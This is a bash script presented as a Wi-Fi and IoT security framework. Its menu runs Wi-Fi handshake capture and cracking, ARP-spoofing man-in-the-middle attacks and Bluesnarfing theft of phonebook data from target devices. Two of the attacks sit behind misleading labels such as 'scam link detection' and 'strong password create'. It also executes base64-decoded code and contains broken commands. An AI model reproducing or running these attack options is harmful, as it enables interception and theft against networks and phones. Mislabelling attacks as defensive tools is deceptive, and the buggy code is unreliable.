#!/bin/bash

cyan="\e[1;36m"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
red='\e[1;31m'
yellow='\e[1;33m'
orange='\e[38;5;166m'
green='\e[1;32m'

if [[ $(/usr/bin/id -u) -ne 0 ]];
then
echo -e "$red This tool run as a root / ROOT REQUIRED "
exit
else
echo ""
echo -e "$green ROOT ACCESS CONFIRM .."
echo ""
sleep 1
fi

clear
echo -n -e "$cyan THIS TOOL USED FOR EDUCATIONAL PURPOSE DON'T USE ANY ILLIGAL ACTIVITY "
sleep 2
clear


# SETUP MONITOR MODE IN WIFI
############################

echo -e "$red

         _______________________________________________________
$green                S E T U P----------------M O N I T O R-M O D E
$red         -------------------------------------------------------
"

echo -n -e "$cyan ENTER YOUR INTERFACE NAME EX (wlan0 / wlan1 / wlan2 )"
echo "
"
echo -e "$b──($red monitormode $b)────[$green~]──[$orange Interface ] "
echo -n -e "$b└─$red# "
read interface

# BANNER WIRELESS FRAMEWORK
##########################




echo -e "$green

        _____________________________________________________
       |                                                     |
       |  W I F I SECURITY - I O T   F R A M E W O R K       |
       |_____________________________________________________|
                                               |_v 2.O_|
$red
         _________________________________________________
        |                                                 |    
        |        S H I V A N I ----- T R I P A T H I      |
        |_________________________________________________|    
"
sleep 1

echo -e "$green
               |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               |                                    $red     WIRELESS-IOT-FRAMEWORK THE FUTURE             $green                                                             |
$green                _____________________________________________________________________________________________________________________________________________________
"

echo -e "$cyan[$yellow*$cyan] Select a options For Wireless Security "
echo "


"

echo -e "
      $cyan[$yellow 1 $cyan ]  WIFI PASSWORD RECOVERING               $cyan[$yellow 5 $cyan ] NETWORK SCANNING
      $cyan[$yellow 2 $cyan ]  NETWORK TRAFFIC ANALYSIS               $cyan[$yellow 6 $cyan ] DETECTION SCAM LINKS / IDENTIFYING LINKS
      $cyan[$yellow 3 $cyan ]  MALWARE DETECTION                      $cyan[$yellow 7 $cyan ] STRONG PASSWORD CREATE
      $cyan[$yellow 4 $cyan ]  BUG / VULNERABILITY DETECTIONS         $cyan[$yellow 8 $cyan ] ENCRYPTION ANY FILE FOR SAFELY SENDING THE DATA

"

echo -e "$b──($red wireless-framework $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read menu


# Wifi Hacking Code
##################


if [[ $menu == 1 ]];
then
echo -e "$b _____________________________________"
echo -e "$green W I F I     H A C K I N G "
echo -e "$b _____________________________________"
echo ""
airmon-ng start $interface
echo -e "$green IF YOU SELECT TARGET THEN ENTER ( CTRL + C ) "
sleep 3
echo -e "$cyan "
airodump-ng $interface
echo -n -e "$green ENTER YOUR TARGET MAC ADDRESS : "
read mac
echo -n -e "$green ENTER YOUR TARGET CHANNEL NO. : "
read ch
echo -n -e "$green ENTER YOUR SAVE FILE NAME ( ex = test ) : "
read test
echo -e "$b _________________________________________"
echo -e "$green A T T A C K I N G   S T A R T E D "
echo -e "$b _________________________________________"
sleep 1
echo ""
echo -e "$green "
airodump-ng --bssid $mac --channel $ch --write $test $interface
echo ""
ls
echo ""
echo -n -e "$green ENTER YOUR .cap FILE YOU SEE DIRECTORY : "
read cap
aircrack-ng $cap
mkdir $test
mv -v $test.cap $test

# NETWORK TRAFFIC CODE
########################


elif [[ $menu == 2 ]] ;
then
echo -e "$b ______________________________________"
echo -e "$green   N E T W O R K - T R A F F I C   "
echo -e "$b ______________________________________"
echo ""

echo -e "$cyan "
echo -n -e "$cyan Enter the any file name you want to save : "
read netw

# Banner and center functions
center_banner() {
    local termwidth=$(stty size | cut -d" " -f2)

    local banner=(
       "------------------------------"
       " N E T W O R K - T R A F F I C"
       "------------------------------"
    )

    echo -e "\e[34m" # Blue color
    for line in "${banner[@]}"; do
        printf "%*s\n" $(( (termwidth + ${#line}) / 2 )) "$line"
    done
    echo -e "\e[0m" # Reset color
}

center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

clear
center_banner

# Loading spinner
center "If you want to stop the capture network traffic simply (CTRL+C) "
source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)


tcpdump -i $interface -w $netw.pcap
tshark -r $netw.pcap

# MALWARE DETECT SCRIPT
#######################

elif [[ $menu == 3 ]];
then
echo ""
clear
echo -e "$b ____________________________________"
echo -e "$green M A L W A R E - D E T E C T     "
echo -e "$b ____________________________________"
echo "----------------------------------------------------------------------"
echo -e "$cyan "
chkrootkit
clear
echo -e "$r RE-scan ------Please be patient "
rkhunter --check

# BUG FINDING SCRIPT
##########################

elif [[ $menu == 4 ]];
then
echo ""
clear
echo -e "$b ______________________________________"
echo -e "$green BUG/VULNERABILITY FINDING         "
echo -e "$b ______________________________________"
echo ""
echo -e "$cyan "
mkdir detect
cd detect
git clone https://github.com/CISOfy/lynis
cd lynis && ./lynis audit system
cd ..
cd ..
rm -rf detect

# NETWORK SCANNING SCRIPT
########################

elif [[ $menu == 5 ]];
then
echo -e "$b ______________________________________________________________________________"
echo -e "$cyan
_ _____ _______        _____  ____  _  __
| \ | | ____|_   _\ \      / / _ \|  _ \| |/ /
|  \| |  _|   | |  \ \ /\ / / | | | |_) | ' /
|_| \_|_____| |_|    \_/\_/  \___/|_| \_\_|\_\

 ____   ____    _    _   _ _   _ ___ _   _      _
/ ___| / ___|  / \  | \ | | \ | |_ _| \ | |/ ___|
\___ \| |     / _ \ |  \| |  \| || ||  \| | |  _
 ___) | |___ / ___ \| |\  | |\  || || |\  | |_| |
|____/ \____/_/   \_\_| \_|_| \_|___|_| \_|\____|

"
echo -e "$b ______________________________________________________________________________"
echo ""
echo -n -e "$green ENTER YOUR NETWORK IP LIKE ( 192.168.X.X ) : "
read ip
echo ""
echo -e "$green

         1. TCP PORT SCANNING
         2. UDP PORT SCANNING
         3. SIMPAL SCANNING
         4. SOME ADVANCED OPTION SCANNING
         5. YOUR PORT CHOICE SCANNING
         6. VERSION SCANNING
"
echo -e "$b──($red Network Scanner $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read network

if [[ $network == 1 ]];
then
nmap -sT $ip

elif [[ $network == 2 ]];
then
nmap -sU $ip

elif [[ $network == 3 ]];
then
nmap $ip

elif [[ $network == 4 ]];
then
nmap -sC -sT -sU -sA $ip

elif [[ $network == 5 ]];
then
echo -n -e "$green ENTER YOUR PORT WITH COMAS LIKE ( 21,22,23 ) : "
read port
nmap -p $port

elif [[ $network == 6 ]];
then
nmap -sV $ip

fi

elif [[ $menu == 6 ]];
then
echo -e "$b _________________________________________________"
echo -e "$cyan

_|      _|  _|_|_|  _|_|_|_|_|  _|      _|
_|_|  _|_|    _|        _|      _|_|  _|_|
_|  _|  _|    _|        _|      _|  _|  _|
_|      _|    _|        _|      _|      _|
_|      _|  _|_|_|      _|      _|      _|

"
echo -e "$b _________________________________________________"
echo ""
echo -e -n "$green ENTER YOUR TARGET INTERFACE NAME ( wlan0 / wlan1 / wlan2 / eth0 ) : "
read mitm
echo -e -n "$green ENTER YOUR TARGET WIFI IP : "
read targetmitm
echo -e -n "$green ENTER YOUR TARGET DEVICE IP : "
read targetdevicemitm
mitmf --arp --spoof --gateway $targetwifiip --target $targetmitm -i $mitm

echo -e "$b ______________________________________"
echo -e "$green A T T A C K   S U C C E S S "
echo -e "$b ______________________________________"


elif [[ $menu == 7 ]];
then
echo -e "$b _________________________________________________"
echo -e "$cyan
__________   ___   ____________
 / / / / / /  / _ \  \ \ \ \ \ \ \

| | | | | |  | |_| |  | | | | | | |
| | | | | |   \___/   | | | | | | |
 \_\_\_\_\_\         /_/_/_/_/_/_/

"
echo -e "$b _________________________________________________"
echo -e "$green"
hciconfig hc0 up
echo "
"
hciconfig hc0
echo "
"
hcitool scan
echo "
"
echo -n -e "$cyan ENTER YOUR TARGET MAC ADDRESS : "
read bluemac
echo -n -e "$cyan ENTER TARGET CHANNEL NUMBER : "
read bluechannel
sdptool browse $bluemac
echo "
"
echo -e "$green
1. READ PHONEBOOK DETAILS
2. LIST OF PHONEBOOK MEMORY STORAGE
3. FULL INFORMATION OF DEVICE
"
echo -e "$b──($red Bluesnarfing $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read snarfing

if [[ $snarfing == 1 ]];
then
bluesnarfer -r 1-100 -C $bluechannel -b $bluemac

elif [[ $snarfing == 2 ]];
then
bluesnarfer -l 1-100 -C $bluechannel -b $bluemac

elif [[ $snarfing == 3 ]];
then
bluesnarfer -i 1-100 -C $bluechannel -b $bluemac

else
echo -e "$red INVALID OPTION "

fi

elif [[ $menu == 99 ]];
then
exit


else
echo -e -n "$b ________________________________"
echo -e -n "$green I N V A L I D   O P T I O N "
echo -e -n "$b ________________________________"
sudo bash wireless-framework.sh

fi
